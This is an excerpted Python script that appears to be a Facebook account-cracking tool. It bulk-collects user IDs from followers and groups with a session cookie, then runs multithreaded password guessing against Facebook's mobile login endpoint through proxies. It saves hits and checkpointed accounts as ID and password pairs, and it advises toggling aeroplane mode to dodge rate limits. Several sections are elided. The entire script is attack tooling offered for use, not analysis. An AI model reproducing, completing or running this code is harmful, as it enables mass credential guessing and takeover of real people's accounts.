...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t                OWNER   : [green] Muhammad Zeeshan [purple] '))
...
def menu(my_name,my_id):
	...
	cetak(nel('\t          WELCOME [green]%s[bold cyan] LOGIN USER'%(my_name)))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('ENTER LIMIT OF IDS (Recommend 5 ) : '))
	except ValueError:
		print('{k}NOT FOUND ')
		exit()
	...
	try:
		...
		print(f'➥{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWSE CHECK YOUR ID LINK {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-FOLLOWER ]----------------#
def dump_pengikut():
...
def grup():
	...
	try:
		...
		print(balmond+m+" CHECK INTERNET..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
...
def setting():
	...
	print('') 
	cetak(nel('[bold yellow]➣1. CLONE JUST OLD IDZ \n➣2. CLONE JUST NEW IDZ(RECOMMEND)\n➣3. CLONE MIX IDZ (NEW/OLD) (RECOMMEND) [bold yellow]'))
	print('')
	hu = input('CHOOSE : ')
	if hu in ['1','01']:
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input(' PASSWORD MENU MANUAL(CHOOSE)/DEFULT(AUTO)( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] ADD PASWORD MAXIMUM 6 WORDS\n[[purple]•[yellow]] EXAMPLE :[green] 556677,786786,123456[purple] '))
...
#-------------------[ SECTION-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]                   • PLEASE WAIT • [bold cyan]')) 
	print(f'                    {m}S {k}M {h}I {u}L {b}E {u}  ★  {b}K {u}A {h} R{k} D{m} O{b}')
	print('')
	print(f'RESULTS {h}OK{u} CHECK : {h}OK/%s {b}'%(okc))
	print(f'RESULTS {k}CP{h} CHECK : {k}CP/%s {b}'%(cpc))
	print(f'TURN AEROPLANE MODE AFTER CLONE IDZ ABOVE {h}1K{u} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple][green] Crack Complete, Donot Forget to Be Thankful[purple] <<[yellow] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}CRACKING -->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     CP But Check it Sometimes it opens JustNow [red]'))
				...
				cetak(nel('[green]      OK ENJOY THIS ID[green]')) 
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]      SORRY YOU ARE NOT LUCKED PLEASE BE PATIENT [red]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Oops 😬 there are no active apps on this account.")
	else:
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Oops 😬 there is no expired application in this account.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Kedaluwarsa"),N))
